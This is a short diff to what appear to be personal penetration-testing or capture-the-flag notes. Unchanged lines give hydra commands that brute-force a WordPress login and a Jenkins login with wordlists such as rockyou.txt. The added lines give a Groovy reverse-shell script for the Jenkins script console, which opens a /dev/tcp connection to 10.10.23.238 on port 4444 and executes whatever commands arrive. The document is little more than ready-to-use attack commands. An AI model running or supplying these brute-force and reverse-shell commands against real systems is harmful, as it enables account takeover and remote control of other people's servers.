@@ -10,4 +10,12 @@ hydra -l Elliot -P fsocity.dic 10.10.66.104 http-post-form "/wp-login.php:log=^U
 
 in JENKINS
 hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
+
+
+Reverse-shell-script-JENKINS
+r = Runtime.getRuntime()
+
+p = r.exec([“/bin/bash”,“-c”,“exec 5<>/dev/tcp/10.10.23.238/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
+
+p.waitFor()
  
